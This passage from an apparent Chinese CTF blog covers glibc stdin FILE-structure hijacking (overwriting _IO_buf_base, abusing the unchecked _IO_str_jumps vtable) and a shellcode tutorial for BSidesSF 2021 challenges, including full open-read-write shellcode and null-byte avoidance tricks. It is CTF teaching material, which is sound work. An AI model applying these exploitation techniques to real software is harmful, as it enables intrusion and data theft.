<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad2088</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:	<span class="number">0x0000001000000000</span>	<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:	<span class="number">0xffffffffffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:	<span class="number">0x00007ffff7dd19c0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd06e0</span></span><br><span class="line"><span class="number">0x7ffff7dd19c0</span> &lt;_IO_wide_data_0&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>进行一次输入之后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad2288</span>	<span class="number">0x0000000000602018</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x0000000000602019</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x0000000000602010</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x0000000000602010</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x0000000000602410</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:	<span class="number">0xffffffffffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:	<span class="number">0x00007ffff7dd19c0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:	<span class="number">0x00000000ffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd06e0</span></span><br><span class="line"><span class="number">0x7ffff7dd19c0</span> &lt;_IO_wide_data_0&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>调用 scanf 之后可以看到_IO_read_ptr、_IO_read_base、_IO_read_end、_IO_buf_base、_IO_buf_end 等域都被初始化</p>
</blockquote>
<p>其实这是分配出来的堆,分配的堆大小是 0x400 个字节，正好对应于_IO_buf_base～_IO_buf_end 在进行写入后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602000</span></span><br><span class="line">Size: <span class="number">0x411</span></span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x602410</span></span><br><span class="line">Size: <span class="number">0x20bf1</span></span><br></pre></td></tr></table></figure>
<p>接下来就可以修改_IO_buf_base任意地址读写了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x7ffff7dd18e0</span></span><br><span class="line"><span class="number">0x7ffff7dd18e0</span> &lt;_IO_2_1_stdin_&gt;:	<span class="number">0x00000000fbad2288</span>	<span class="number">0x0000000000602018</span></span><br><span class="line"><span class="number">0x7ffff7dd18f0</span> &lt;_IO_2_1_stdin_+<span class="number">16</span>&gt;:	<span class="number">0x0000000000602019</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1900</span> &lt;_IO_2_1_stdin_+<span class="number">32</span>&gt;:	<span class="number">0x0000000000602010</span>	<span class="number">0x0000000000602010</span></span><br><span class="line"><span class="number">0x7ffff7dd1910</span> &lt;_IO_2_1_stdin_+<span class="number">48</span>&gt;:	<span class="number">0x0000000000602010</span>	<span class="number">0x00007ffff7dd2740</span> &lt;==_IO_buf_base</span><br><span class="line"><span class="number">0x7ffff7dd1920</span> &lt;_IO_2_1_stdin_+<span class="number">64</span>&gt;:	<span class="number">0x00007ffff7dd27c0</span>	<span class="number">0x0000000000000000</span> &lt;==_IO_buf_end</span><br><span class="line"><span class="number">0x7ffff7dd1930</span> &lt;_IO_2_1_stdin_+<span class="number">80</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1940</span> &lt;_IO_2_1_stdin_+<span class="number">96</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1950</span> &lt;_IO_2_1_stdin_+<span class="number">112</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0xffffffffffffffff</span></span><br><span class="line"><span class="number">0x7ffff7dd1960</span> &lt;_IO_2_1_stdin_+<span class="number">128</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd3790</span></span><br><span class="line"><span class="number">0x7ffff7dd1970</span> &lt;_IO_2_1_stdin_+<span class="number">144</span>&gt;:	<span class="number">0xffffffffffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1980</span> &lt;_IO_2_1_stdin_+<span class="number">160</span>&gt;:	<span class="number">0x00007ffff7dd19c0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd1990</span> &lt;_IO_2_1_stdin_+<span class="number">176</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19a0</span> &lt;_IO_2_1_stdin_+<span class="number">192</span>&gt;:	<span class="number">0x00000000ffffffff</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19b0</span> &lt;_IO_2_1_stdin_+<span class="number">208</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007ffff7dd06e0</span></span><br><span class="line"><span class="number">0x7ffff7dd19c0</span> &lt;_IO_wide_data_0&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd19d0</span> &lt;_IO_wide_data_0+<span class="number">16</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>看一下buf里面的内容</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x7ffff7dd2740</span></span><br><span class="line"><span class="number">0x7ffff7dd2740</span> &lt;buf&gt;:	<span class="number">0x000a434343434343</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2750</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2760</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2770</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2780</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2790</span> &lt;ttyname_buf&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27a0</span> &lt;getmntent_buffer&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27b0</span> &lt;qfcvt_bufptr&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27c0</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27d0</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27e0</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd27f0</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2800</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2810</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2820</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7ffff7dd2830</span> &lt;<span class="built_in">buffer</span>&gt;:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<h2 id="IO-str-jumps-gt-overflow"><a href="#IO-str-jumps-gt-overflow" class="headerlink" title="_IO_str_jumps -&gt; overflow"></a>_IO_str_jumps -&gt; overflow</h2><p><code>libc</code>中不仅仅只有<code>_IO_file_jumps</code>这么一个<code>vtable</code>，还有一个叫<code>_IO_str_jumps</code>的 ，这个 <code>vtable</code> 不在 check 范围之内。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(<span class="built_in">overflow</span>, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(<span class="built_in">read</span>, _IO_default_read),</span><br><span class="line">  JUMP_INIT(<span class="built_in">write</span>, _IO_default_write),</span><br><span class="line">  JUMP_INIT(<span class="built_in">seek</span>, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(<span class="built_in">close</span>, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

        </div></article>
      <article class="post">
    <header class="post-header">
      <h1 class="post-title"><a class="post-link" href="/2021/03/21/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode/">如何编写shellcode</a>
        </h1>

      <div class="post-meta">
        <span class="post-time">
          2021-03-21
        </span><span class="post-visits"
             data-url="/2021/03/21/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode/"
             data-title="如何编写shellcode">
          Visits 0
        </span>
        </div>
    </header>

    <div class="post-content"><p>写这个主要是校赛出了一道题，来源于国外的一道题目</p>
<p>具体的话可以看[这个][<a href="https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]，写得很清楚" target="_blank" rel="noopener">https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]，写得很清楚</a></p>
<h1 id="0x01-method"><a href="#0x01-method" class="headerlink" title="0x01 method"></a>0x01 method</h1><h2 id="nasm"><a href="#nasm" class="headerlink" title="nasm"></a>nasm</h2><p>首先我们需要这个nasm东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whereis nasm</span><br><span class="line">&#x2F;&#x2F;如果没有，直接</span><br><span class="line">sudo apt-get install nasm</span><br></pre></td></tr></table></figure>
<p>接下来我们来编译一个汇编文件</p>
<p>具体内容如下，其实就是输出hello,world</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; hello.asm </span><br><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">section .text            ; 代码段声明</span><br><span class="line">global main            ; 指定入口函数</span><br><span class="line">main:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">                         ; 退出程序</span><br><span class="line">        mov ebx, 0       ; 参数一：退出代码</span><br><span class="line">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 hello.asm -o hello.o</span><br><span class="line">&#x2F;&#x2F;nasm -f [输出文件格式] [源文件] -o [目标文件]</span><br><span class="line">gcc -m32 hello.o -o hello</span><br></pre></td></tr></table></figure>
<p>应该可以看到运行出了hello,world，其实我们也就是从汇编然后编译执行了一个程序</p>
<p>但我们如何查看其中十六进制数据呢？</p>
<p>当然有多种方法</p>
<p>比如objdump,objcopy等</p>
<p>这里主要用一下objcopy</p>
<p>具体每个工具用法可以自己去查，这里就不说了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objcopy -O binary hello.o code</span><br><span class="line">xxd -i code</span><br></pre></td></tr></table></figure>
<p>这样我们就生成了自己的shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ xxd -i code</span><br><span class="line">unsigned char code[] &#x3D; &#123;</span><br><span class="line">  0xba, 0x0e, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xbb, 0x01,</span><br><span class="line">  0x00, 0x00, 0x00, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xbb, 0x00,</span><br><span class="line">  0x00, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xcd, 0x80</span><br><span class="line">&#125;;</span><br><span class="line">unsigned int code_len &#x3D; 34;</span><br></pre></td></tr></table></figure>
<h1 id="0x02-challenge"><a href="#0x02-challenge" class="headerlink" title="0x02 challenge"></a>0x02 challenge</h1><p>这里总共分为三个challenge，主要是针对64位的</p>
<p>也就是说我们参数在rdi rsi rdx中</p>
<p>我们首先得要知道写shellcode目的是什么？</p>
<p>在CTF中我们通常有两种一种就是拿到/bin/sh，另一种就是就是知道flag路径直接进行ORW</p>
<p>先来看第一个挑战吧，这里原文作者都是用ORW(open read write)来做的，我们是来学东西的，也不必纠结那些东西。</p>
<h2 id="runme1"><a href="#runme1" class="headerlink" title="runme1"></a>runme1</h2><p>先来看原作的第一个shellcode</p>
<p>注释都已经很详细了</p>
<p>就是很简单的ORW</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  mov rax, 2 ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  call getfilename ; Pushes the next address onto the stack and jumps down</span><br><span class="line">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot;,0 ; The literal flag, null terminated</span><br><span class="line">getfilename:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line">  mov rsi, 0 ; Flags &#x3D; 0</span><br><span class="line">  mov rdx, 0 ; Mode &#x3D; 0</span><br><span class="line">  syscall ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  mov rax, 0 ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  pop rdi ; Move the file handle into rdi</span><br><span class="line">  pop rsi ; Use the same buffer where the filename pointer is stored (it&#39;s readable and writable)</span><br><span class="line">  mov rdx, 30 ; rdx is the count</span><br><span class="line">  syscall ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  mov rax, 1 ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  mov rdi, 1 ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line">  mov rdx, 30 ; rdx is the count again</span><br><span class="line">  syscall ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  mov rax, 60 ; Syscall 60 &#x3D; exit</span><br><span class="line">  mov rdi, 0 ; Exit with code 0</span><br><span class="line">  syscall ; Perform an exit</span><br></pre></td></tr></table></figure>
<h2 id="runme2"><a href="#runme2" class="headerlink" title="runme2"></a>runme2</h2><p>这个challenge加了限制条件，没有空字节</p>
<p>先看一下第一个写的shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ ndisasm -b64 1</span><br><span class="line">00000000  B802000000        mov eax,0x2</span><br><span class="line">00000005  E813000000        call qword 0x1d</span><br><span class="line">0000000A  2F                db 0x2f</span><br><span class="line">0000000B  686F6D652F        push qword 0x2f656d6f</span><br><span class="line">00000010  63                db 0x63</span><br><span class="line">00000011  7466              jz 0x79</span><br><span class="line">00000013  2F                db 0x2f</span><br><span class="line">00000014  666C              o16 insb</span><br><span class="line">00000016  61                db 0x61</span><br><span class="line">00000017  672E7478          cs jz 0x93</span><br><span class="line">0000001B  7400              jz 0x1d</span><br><span class="line">0000001D  5F                pop rdi</span><br><span class="line">0000001E  BE00000000        mov esi,0x0</span><br><span class="line">00000023  BA00000000        mov edx,0x0</span><br><span class="line">00000028  0F05              syscall</span><br><span class="line">0000002A  57                push rdi</span><br><span class="line">0000002B  50                push rax</span><br><span class="line">0000002C  B800000000        mov eax,0x0</span><br><span class="line">00000031  5F                pop rdi</span><br><span class="line">00000032  5E                pop rsi</span><br><span class="line">00000033  BA1E000000        mov edx,0x1e</span><br><span class="line">00000038  0F05              syscall</span><br><span class="line">0000003A  B801000000        mov eax,0x1</span><br><span class="line">0000003F  BF01000000        mov edi,0x1</span><br><span class="line">00000044  BA1E000000        mov edx,0x1e</span><br><span class="line">00000049  0F05              syscall</span><br><span class="line">0000004B  B83C000000        mov eax,0x3c</span><br><span class="line">00000050  BF00000000        mov edi,0x0</span><br><span class="line">00000055  0F05              syscall</span><br></pre></td></tr></table></figure>
<p>发现有很多0字节，这里要想不出现00字节该怎么办呢？</p>
<p>我们首先得看到哪里有0字节</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000005  E813000000        call qword 0x1d</span><br><span class="line">&#x2F;&#x2F;call A+0x13 &#x3D; call 0x1d</span><br></pre></td></tr></table></figure>
<p>call中有很多00字节，这里可以用jmp替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000005  EB13              jmp short 0x1d</span><br></pre></td></tr></table></figure>
<p>这里提到了一个calling backwards，主要就是调用上方代码。</p>
<p>这里还有几个trick</p>
<ol>
<li>mov REG,0 ==&gt;xor REG,REG</li>
<li>rax==&gt;al</li>
</ol>
